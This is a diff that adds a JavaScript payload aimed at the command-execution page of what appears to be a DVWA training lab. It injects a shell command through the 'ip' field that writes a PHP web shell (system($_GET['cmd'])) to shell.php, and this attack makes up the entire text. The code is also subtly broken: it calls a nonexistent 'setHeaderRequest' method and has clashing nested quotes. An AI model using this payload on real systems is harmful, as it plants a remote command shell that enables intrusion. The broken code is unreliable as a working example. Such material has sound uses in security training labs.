@@ -1,0 +1,10 @@
+<script>
+function createShell(command)
+{
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'http://dvwa.local/vulnerabilities/exec/', true);
+xhr.setHeaderRequest('Content-type', 'application/x-www-form-urlencoded');
+xhr.send('ip='+command+'&submit=submit');
+}
+createShell("127.0.0.1; echo '<?php system($_GET['cmd']);?>' > shell.php");
+</script>
